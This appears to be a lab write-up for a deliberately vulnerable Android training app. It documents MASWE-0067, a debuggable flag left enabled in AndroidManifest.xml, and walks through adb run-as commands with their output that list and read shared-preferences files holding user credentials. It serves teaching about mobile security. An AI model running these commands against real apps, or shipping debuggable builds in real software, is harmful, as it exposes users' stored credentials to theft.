# MASWE-0067: Debuggable Flag Not Disabled

The relevant code for this vulnerability can be seen in main/AndroidManifest.xml.

## The vulnerability consists of:

1. Setting the app to being debuggable in the lines here:
```xml
<application
      android:icon="@mipmap/ic_launcher"
      android:label="@string/app_name"
      android:roundIcon="@mipmap/ic_launcher_round"
      android:supportsRtl="true"
      android:theme="@style/Theme.maswe_platform"
      android:debuggable="true"
```

## The vulnerability can be exploited by:
The app being set to debuggable destroys all security gained by the android sandboxing system. An attacker can now read and modify the apps memory space at will. 
Below is a specific example of how this could look like, but there are many more exploits for this.  

1. List packages
```shell
C:\Users\Domi>adb shell pm list packages | findstr maswe
package:com.dkronig.maswe_platform
package:com.dkronig.maswe_crypto
package:com.dkronig.maswe_storage
```

2. Check if package is indeed debuggable by running run-as
```shell
C:\Users\Domi>adb shell run-as com.dkronig.maswe_platform id
uid=10227(u0_a227) gid=10227(u0_a227) groups=10227(u0_a227),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs),50227(all_a227) context=u:r:runas_app:s0:c227,c256,c512,c768
```

3. List all shared preferences files
```shell
C:\Users\Domi>adb shell run-as com.dkronig.maswe_platform ls shared_prefs
maswe_0053_user_credentials.xml
maswe_0055_user_credentials.xml
maswe_0064_user_credentials.xml
maswe_0067_user_credentials.xml
```

4. Read any of the files
```shell
C:\Users\Domi>adb shell run-as com.dkronig.maswe_platform cat shared_prefs/maswe_0053_user_credentials.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="users_json">{&quot;qwertz&quot;:{&quot;password&quot;:&quot;doVMBwPTG2ISsgy06P\/eJpfWXKT5dOJIO9jYl8FzWhGfmA==&quot;}}</string>
</map>
```
